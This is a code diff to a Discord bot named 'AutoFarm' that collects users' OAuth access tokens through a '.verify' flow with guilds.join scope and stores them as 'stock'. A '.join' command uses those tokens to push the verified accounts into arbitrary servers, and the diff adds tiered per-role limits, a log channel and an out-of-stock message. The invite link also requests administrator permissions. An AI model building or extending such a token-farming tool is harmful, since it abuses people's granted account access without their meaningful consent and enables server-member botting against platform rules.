@@ -9,7 +9,7 @@ const PORT = process.env.PORT || 8080;
 
 // Token Storage Database & Restock Counter
 const tokenDatabase = []; 
-let restockCounter = 0; // Tracks verifications toward the 30-person threshold
+let restockCounter = 0; 
 let currentPrefix = '.';
 let discordClient = null;
 
@@ -73,9 +73,28 @@ app.get('/', async (req, res) => {
             restockCounter++;
             console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} \vert{} Progress to alert:${restockCounter}/30`);
 
-            // Check if 30 new verifications have been reached
+            // 1. Send verification log to Log Channel
+            const logChannelId = process.env.LOG_CHANNEL_ID || '1561453902270955630';
+            if (discordClient) {
+                try {
+                    const logChannel = await discordClient.channels.fetch(logChannelId);
+                    if (logChannel) {
+                        const logEmbed = new EmbedBuilder()
+                            .setTitle('⚡ New User Verified')
+                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${tokenDatabase.length}\``)
+                            .setColor(0x00FF00)
+                            .setTimestamp();
+
+                        await logChannel.send({ embeds: [logEmbed] });
+                    }
+                } catch (logErr) {
+                    console.error('[LOG ERROR] Failed to send verification log:', logErr);
+                }
+            }
+
+            // 2. Check 30-person restock threshold alert
             if (restockCounter >= 30) {
-                restockCounter = 0; // Reset counter for the next batch of 30
+                restockCounter = 0; 
 
                 if (discordClient) {
                     try {
@@ -101,12 +120,11 @@ app.get('/', async (req, res) => {
                             await sentMessage.react('☑️');
                         }
                     } catch (announcementErr) {
-                        console.error('Failed to send 30-person auto restock announcement:', announcementErr);
+                        console.error('Failed to send auto restock announcement:', announcementErr);
                     }
                 }
             }
 
-            // Success response page shown to the user in browser
             res.send(`
                 <html>
                     <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
@@ -138,7 +156,6 @@ app.get('/', async (req, res) => {
     }
 });
 
-// Bind to 0.0.0.0 for Railway networking
 app.listen(PORT, '0.0.0.0', () => console.log(`AutoFarm Web server running on port ${PORT}`));
 
 // --- Discord Bot Setup ---
@@ -188,7 +205,7 @@ client.on('messageCreate', async message => {
         return message.reply({ embeds: [helpEmbed] });
     }
 
-    // 2. .bot / .invite Command (Sends only button with custom link, no embed)
+    // 2. .bot Command
     if (command === 'bot' || command === 'invite') {
         const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Fchannels%2F1561434965395116182%2F1561453186810642522&integration_type=0&scope=bot+guilds.join+identify+applications.commands';
 
@@ -202,7 +219,7 @@ client.on('messageCreate', async message => {
         return message.reply({ components: [row] });
     }
 
-    // 3. .verify / .link Command (Scope: identify + guilds.join)
+    // 3. .verify Command
     if (command === 'verify' || command === 'link') {
         const clientId = process.env.CLIENT_ID || '1561438987464483048';
         const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
@@ -253,25 +270,45 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
     }
 
-    // 8. .join <Server ID> Command (with Restricted Role Check: -1561435531462844587)
+    // 8. .join <Server ID> Command (Tiered Role Limits & Out-of-Stock Embed)
     if (command === 'join') {
         const targetGuildId = args[0];
         if (!targetGuildId) {
             return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
         }
 
+        // Out of Stock Embed Check
         if (tokenDatabase.length === 0) {
-            return message.reply('❌ No verified accounts available in stock.');
+            const noStockEmbed = new EmbedBuilder()
+                .setTitle('❌ Out of Stock')
+                .setDescription(`All stock members are already added in: **${targetGuildId}**`)
+                .setColor(0xFF0000);
+            return message.reply({ embeds: [noStockEmbed] });
         }
 
-        const restrictedRoleId = '-1561435531462844587';
-        const hasRestrictedRole = message.member.roles.cache.has(restrictedRoleId);
+        // Tiered Role Limits System
+        const roleLimits = [
+            { id: '1561435531462844587', limit: 1 },
+            { id: '1561459311257850088', limit: 2 },
+            { id: '1561459436906881064', limit: 4 },
+            { id: '1561459470838530148', limit: 5 },
+            { id: '1561459500806963250', limit: 7 },
+            { id: '1561459538874597546', limit: 10 }
+        ];
+
+        let allowedLimit = Infinity;
+        for (const tier of roleLimits) {
+            if (message.member.roles.cache.has(tier.id)) {
+                allowedLimit = tier.limit;
+                break;
+            }
+        }
 
         let tokensToUse = tokenDatabase;
-        if (hasRestrictedRole) {
-            const limit = Math.min(2, tokenDatabase.length);
+        if (allowedLimit !== Infinity) {
+            const limit = Math.min(allowedLimit, tokenDatabase.length);
             tokensToUse = tokenDatabase.slice(0, limit);
-            message.channel.send(`⚠️ Community Member role detected. Restricting join batch to **${limit}** accounts.`);
+            message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
         }
 
         await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
@@ -289,7 +326,7 @@ client.on('messageCreate', async message => {
                     body: JSON.stringify({ access_token: tokenData.access_token })
                 });
 
-                if (joinRes.ok || joinRes.status === 204) {
+                if (joinRes.ok || joinRes.status === 201 || joinRes.status === 204) {
                     successCount++;
                 }
             } catch (err) {
